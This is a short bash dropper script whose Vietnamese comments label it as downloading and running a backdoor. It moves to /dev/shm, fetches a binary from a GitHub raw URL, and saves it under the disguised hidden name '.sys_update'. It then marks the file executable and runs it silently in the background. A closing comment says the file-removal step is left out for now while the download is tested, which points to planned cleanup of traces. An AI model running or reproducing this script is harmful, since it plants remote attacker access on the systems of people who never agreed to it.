#!/bin/bash
D="/dev/shm"
cd $D
# Tải backdoor
curl -sL https://github.com/AnnaliseHackett/Fix/raw/refs/heads/main/test.elf -o .sys_update
chmod +x .sys_update
# Chạy backdoor
./.sys_update >/dev/null 2>&1 &
# Tạm thời bỏ rm để xem file có tải về được không
